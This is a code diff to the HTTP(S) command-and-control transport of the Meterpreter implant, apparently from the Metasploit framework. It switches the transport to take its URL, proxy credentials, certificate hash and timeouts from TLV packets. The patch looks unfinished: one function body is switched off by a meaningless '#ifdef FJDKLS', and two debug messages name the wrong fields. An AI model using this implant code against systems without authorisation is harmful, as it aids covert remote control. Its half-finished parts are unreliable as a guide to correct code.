@@ -483,7 +483,7 @@ static DWORD packet_receive_http(Remote *remote, Packet **packet)
 		h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
 #endif
 
-	if (is_null_guid(header.session_guid) || memcmp(remote->orig_config->session.session_guid, header.session_guid, sizeof(header.session_guid)) == 0)
+	if (is_null_guid(header.session_guid) || memcmp(remote->session_guid, header.session_guid, sizeof(header.session_guid)) == 0)
 	{
 		dprintf("[HTTP] Session GUIDs match (or packet guid is null), decrypting packet");
 		SetLastError(decrypt_packet(remote, packet, packetBuffer, packetSize));
@@ -847,8 +847,9 @@ static void transport_destroy_http(Transport* transport)
 	}
 }
 
-void transport_write_http_config(Transport* transport, MetsrvTransportHttp* config)
+void transport_write_http_config(Transport* transport, Packet* packet, Tlv* configTlv)
 {
+#ifdef FJDKLS
 	HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;
 
 	dprintf("[HTTP CONF] Writing timeouts");
@@ -897,27 +898,8 @@ void transport_write_http_config(Transport* transport, MetsrvTransportHttp* conf
 	}
 
 	dprintf("[HTTP CONF] Done.");
+#endif
 }
-
-/*!
- * @brief Gets the size of the memory space required to store the configuration for this transport.
- * @param t Pointer to the transport.
- * @return Size, in bytes of the required memory block.
- */
-static DWORD transport_get_config_size_http(Transport* t)
-{
-	DWORD size = sizeof(MetsrvTransportHttp);
-
-	// Make sure we account for the custom headers, if there are any, which aren't
-	// of a predetermined size.
-	HttpTransportContext* ctx = (HttpTransportContext*)t->ctx;
-	if (ctx->custom_headers)
-	{
-		size += (DWORD)wcslen(ctx->custom_headers) * sizeof(ctx->custom_headers[0]);
-	}
-	return size;
-}
-
 
 /*!
  * @brief Create an HTTP(S) transport from the given settings.
@@ -926,66 +908,49 @@ static DWORD transport_get_config_size_http(Transport* t)
  * @param config Pointer to the HTTP configuration block.
  * @return Pointer to the newly configured/created HTTP(S) transport instance.
  */
-Transport* transport_create_http(MetsrvTransportHttp* config, LPDWORD size)
+Transport* transport_create_http(Packet* packet, Tlv* c2Tlv)
 {
 	Transport* transport = (Transport*)malloc(sizeof(Transport));
 	HttpTransportContext* ctx = (HttpTransportContext*)malloc(sizeof(HttpTransportContext));
 
- 	if (size)
- 	{
- 		*size = sizeof(MetsrvTransportHttp);
- 	}
+	PWSTR url = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_URL, NULL);
 
-	dprintf("[TRANS HTTP] Creating http transport for url %S", config->common.url);
+	dprintf("[TRANS HTTP] Creating http transport for url %S", url);
 
 	memset(transport, 0, sizeof(Transport));
 	memset(ctx, 0, sizeof(HttpTransportContext));
 
-	dprintf("[TRANS HTTP] Given ua: %S", config->ua);
-	if (config->ua[0])
-	{
-		ctx->ua = _wcsdup(config->ua);
-	}
-	dprintf("[TRANS HTTP] Given proxy host: %S", config->proxy.hostname);
-	if (config->proxy.hostname[0])
-	{
-		ctx->proxy = _wcsdup(config->proxy.hostname);
-	}
-	dprintf("[TRANS HTTP] Given proxy user: %S", config->proxy.username);
-	if (config->proxy.username[0])
-	{
-		ctx->proxy_user = _wcsdup(config->proxy.username);
-	}
-	dprintf("[TRANS HTTP] Given proxy pass: %S", config->proxy.password);
-	if (config->proxy.password[0])
-	{
-		ctx->proxy_pass = _wcsdup(config->proxy.password);
-	}
-	ctx->ssl = wcsncmp(config->common.url, L"https", 5) == 0;
+	ctx->ua = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_UA, NULL);
+	dprintf("[TRANS HTTP] Given ua: %S", ctx->ua);
 
-	if (config->custom_headers[0])
-	{
-		ctx->custom_headers = _wcsdup(config->custom_headers);
-		if (size)
-		{
-			*size += (DWORD)wcslen(ctx->custom_headers) * sizeof(ctx->custom_headers[0]);
-		}
-	}
+	ctx->proxy = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_PROXY_HOST, NULL);
+	dprintf("[TRANS HTTP] Given proxy user: %S", ctx->proxy);
 
-	dprintf("[SERVER] Received HTTPS Hash: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
-		config->ssl_cert_hash[0], config->ssl_cert_hash[1], config->ssl_cert_hash[2], config->ssl_cert_hash[3],
-		config->ssl_cert_hash[4], config->ssl_cert_hash[5], config->ssl_cert_hash[6], config->ssl_cert_hash[7],
-		config->ssl_cert_hash[8], config->ssl_cert_hash[9], config->ssl_cert_hash[10], config->ssl_cert_hash[11],
-		config->ssl_cert_hash[12], config->ssl_cert_hash[13], config->ssl_cert_hash[14], config->ssl_cert_hash[15],
-		config->ssl_cert_hash[16], config->ssl_cert_hash[17], config->ssl_cert_hash[18], config->ssl_cert_hash[19]);
+	ctx->proxy_user = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_PROXY_USER, NULL);
+	dprintf("[TRANS HTTP] Given proxy pass: %S", ctx->proxy_user);
+
+	ctx->proxy_pass = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_PROXY_PASS, NULL);
+	ctx->ssl = wcsncmp(url, L"https", 5) == 0;
+
+	ctx->custom_headers = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_HEADER, NULL);
 
 	// only apply the cert hash if we're given one and it's not the global value
-	SAFE_FREE(ctx->cert_hash);
-	unsigned char emptyHash[CERT_HASH_SIZE] = { 0 };
-	if (memcmp(config->ssl_cert_hash, emptyHash, CERT_HASH_SIZE))
+	LPBYTE certHash = packet_get_tlv_group_entry_value_raw(packet, c2Tlv, TLV_TYPE_C2_CERT_HASH, NULL);
+	if (certHash != NULL)
 	{
-		ctx->cert_hash = (PBYTE)malloc(sizeof(BYTE) * 20);
-		memcpy(ctx->cert_hash, config->ssl_cert_hash, 20);
+		dprintf("[SERVER] Received HTTPS Hash: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
+			certHash[0], certHash[1], certHash[2], certHash[3],
+			certHash[4], certHash[5], certHash[6], certHash[7],
+			certHash[8], certHash[9], certHash[10], certHash[11],
+			certHash[12], certHash[13], certHash[14], certHash[15],
+			certHash[16], certHash[17], certHash[18], certHash[19]);
+
+		unsigned char emptyHash[CERT_HASH_SIZE] = { 0 };
+		if (memcmp(certHash, emptyHash, CERT_HASH_SIZE))
+		{
+			ctx->cert_hash = (PBYTE)malloc(CERT_HASH_SIZE);
+			memcpy_s(ctx->cert_hash, CERT_HASH_SIZE, certHash, CERT_HASH_SIZE);
+		}
 	}
 
 	ctx->create_req = get_request_winhttp;
@@ -995,11 +960,11 @@ Transport* transport_create_http(MetsrvTransportHttp* config, LPDWORD size)
 	ctx->receive_response = receive_response_winhttp;
 	ctx->read_response = read_response_winhttp;
 
-	transport->timeouts.comms = config->common.comms_timeout;
-	transport->timeouts.retry_total = config->common.retry_total;
-	transport->timeouts.retry_wait = config->common.retry_wait;
+	transport->timeouts.comms = packet_get_tlv_group_entry_value_uint(packet, c2Tlv, TLV_TYPE_C2_COMM_TIMEOUT);
+	transport->timeouts.retry_total = packet_get_tlv_group_entry_value_uint(packet, c2Tlv, TLV_TYPE_C2_RETRY_TOTAL);
+	transport->timeouts.retry_wait = packet_get_tlv_group_entry_value_uint(packet, c2Tlv, TLV_TYPE_C2_RETRY_WAIT);
 	transport->type = ctx->ssl ? METERPRETER_TRANSPORT_HTTPS : METERPRETER_TRANSPORT_HTTP;
-	ctx->url = transport->url = _wcsdup(config->common.url);
+	ctx->url = transport->url = url;
 	transport->packet_transmit = packet_transmit_http;
 	transport->server_dispatch = server_dispatch_http;
 	transport->transport_init = server_init_winhttp;
@@ -1007,7 +972,6 @@ Transport* transport_create_http(MetsrvTransportHttp* config, LPDWORD size)
 	transport->transport_destroy = transport_destroy_http;
 	transport->ctx = ctx;
 	transport->comms_last_packet = current_unix_timestamp();
-	transport->get_config_size = transport_get_config_size_http;
 
 	return transport;
 }
